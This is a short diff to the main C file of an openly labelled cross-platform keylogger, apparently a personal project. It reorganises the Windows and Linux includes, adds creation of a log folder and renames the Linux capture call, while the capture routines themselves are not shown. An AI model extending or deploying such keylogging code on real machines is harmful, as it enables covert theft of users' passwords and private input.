@@ -1,7 +1,12 @@
-#include <stdio.h>
-#include "Windows/win_keylog.c"
+// Main file launching the keylogger depending on the OS
 
-// depending on the OS, we'll use a different path for the log file
+#include <stdio.h>
+#include "Windows/win_keylog.h"
+#include "Linux/linux_keylog.h"
+#include "writing/file.h"
+
+// folder log will contain the log files for each OS
+// the log files will be named according to the OS
 #ifdef __linux__
     #define LOGFILE "../log/unix.log"
 #elif defined _WIN32
@@ -12,10 +17,12 @@
 
 // calling the right keylogger depending on the OS
 int main() {
+    // Create the log folder if it doesn't exist
+    CreateLogFolder("../log");
     printf("Listening for keystrokes...\n");
     #ifdef __linux__
         // keylogger for Unix
-        linux_keylog(LOGFILE);
+        lin_keylog(LOGFILE);
 
 	#elif defined _WIN32	
         // keylogger for Windows
